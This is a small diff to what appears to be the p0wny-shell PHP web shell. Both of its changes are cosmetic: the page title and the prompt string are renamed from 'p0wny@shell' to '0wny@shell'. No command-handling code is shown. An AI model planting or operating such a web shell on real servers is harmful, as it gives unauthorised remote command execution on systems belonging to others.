@@ -96,7 +96,7 @@ if (isset($_GET["feature"])) {
 
     <head>
         <meta charset="UTF-8" />
-        <title>p0wny@shell:~#</title>
+        <title>0wny@shell:~#</title>
         <meta name="viewport" content="width=device-width, initial-scale=1.0" />
         <style>
             html, body {
@@ -293,7 +293,7 @@ if (isset($_GET["feature"])) {
                     var splittedCwd = cwd.split("/");
                     shortCwd = "…/" + splittedCwd[splittedCwd.length-2] + "/" + splittedCwd[splittedCwd.length-1];
                 }
-                return "p0wny@shell:<span title=\"" + cwd + "\">" + shortCwd + "</span>#";
+                return "0wny@shell:<span title=\"" + cwd + "\">" + shortCwd + "</span>#";
             }
             function updateCwd(cwd) {
                 if (cwd) {
